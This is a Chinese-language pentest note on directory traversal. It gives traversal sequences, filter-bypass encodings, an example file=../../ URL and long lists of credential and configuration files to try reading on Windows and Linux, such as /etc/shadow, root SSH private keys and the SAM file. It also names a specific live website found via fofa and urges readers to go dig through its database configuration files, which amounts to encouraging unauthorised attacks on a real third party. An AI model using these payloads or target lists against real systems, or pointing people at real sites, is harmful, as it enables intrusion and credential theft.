#### 目录遍历

通过使用 `../` 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。

- `../`

- `..\`

- `..;/`

  比如这种

[![I1dY8g.png](https://z3.ax1x.com/2021/11/07/I1dY8g.png)](https://imgtu.com/i/I1dY8g)



##### 过滤绕过

​	单次替换`...//`           URL编码   16位Unicode编码`\u002e`        超长UTF-8编码`\%e0%40%ae`

##### 实战网站测试

下面是我在fofa上找到的，大家可以去看看

http://www.leiziyeah.top/

[![I1dTPO.png](https://z3.ax1x.com/2021/11/07/I1dTPO.png)](https://imgtu.com/i/I1dTPO)

这个网站我记得是有一个子域名是他的云网盘存储，可以去数据库翻一番他的配置文件

~~~php
http://www.test.com/my.jsp?file=../../Windows.system.ini
可以构造类似url去读对方的数据库，中间件，系统配置文件等等等
详细可读内网在文件包含/文件读取/文件下载中有记录的
~~~

~~~
Windows
C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS 配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql 配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //php 配置信息
C:\Windows\my.ini //Mysql 配置信息
C:\Windows\win.ini //Windows 系统的一个基本系统配置文件
~~~

~~~
Linux
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow
/usr/local/app/php5/lib/php.ini //PHP 配置文件
/etc/my.cnf //mysql 配置文件
/etc/httpd/conf/httpd.conf //apache 配置文件
/root/.bash_history //用户历史命令记录文件
/root/.mysql_history //mysql 历史命令记录文件
/proc/mounts //记录系统挂载设备
/porc/config.gz //内核配置文件
/var/lib/mlocate/mlocate.db //全文件路径
/porc/self/cmdline //当前进程的 cmdline 参数
都可以尝试下载
~~~

比如apache flink的目录遍历漏洞，可以在github上搜一搜小脚本

















